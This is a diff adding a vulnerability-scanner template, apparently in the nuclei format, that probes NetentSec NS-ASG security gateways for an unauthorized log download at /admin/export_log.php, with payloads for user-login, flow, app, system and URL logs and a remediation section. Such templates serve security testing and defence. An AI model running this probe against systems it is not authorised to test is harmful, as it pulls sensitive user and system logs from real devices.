@@ -1,0 +1,47 @@
+id: wamgkang-unauthorized-export_log
+info:
+  name: NetentSec NS-ASG Unauthorized Log Download
+  author:
+  - 折跃
+  description: |-
+    NetentSec NS-ASG unauthorized log download
+    Beijing NetentSec Technology Co., Ltd. is a provider of network application management devices.
+
+    The NetentSec NS-ASG application security gateway has an unauthorized log download vulnerability. An attacker can exploit the vulnerability to obtain sensitive information.
+  reference:
+  - ""
+  severity: high
+  remediation: |
+    Official fix:
+    1. It is recommended that users obtain the latest patch or latest version from the official website:
+    https://www.netentsec.com
+    Temporary fix:
+    1. Validate user-supplied information on both the front end and the back end using a dual verification mechanism.
+    2. Verify that users are authorized to call the relevant functionality before calling it.
+    3. Encrypt resource IDs for direct object references to prevent attackers from enumerating IDs, and treat sensitive data specially.
+    4. Use mature permission management frameworks, such as Spring Security.
+    5. Credentials used for access operations (such as user IDs, product numbers, order serial numbers, etc.) should preferably be obtained server-side by associating the session or by storing encrypted values in the session.
+    6. When credentials for access operations (such as user IDs, product numbers, order serial numbers, etc.) must be submitted via forms or other parameters, use constructions that are hard to guess (add letters and random digits, etc.) or encrypt them with a strong algorithm before submission. Strictly validate that the credentials submitted by the client match the session permissions, such as whether the submitted product number belongs to the logged-in user.
+    7. Enforce strict permission validation on administrative modules; if not necessary, avoid exposing them to the internet or apply access control at the network layer.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'Defaultgp')
+  path:
+  - '{{BaseURL}}/admin/export_log.php?type={{varPath}}'
+  attack: batteringram
+  method: GET
+  payloads:
+    varPath:
+    - userlogin
+    - userflow
+    - userapp
+    - syslog
+    - url
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
+  stop-at-first-match: true
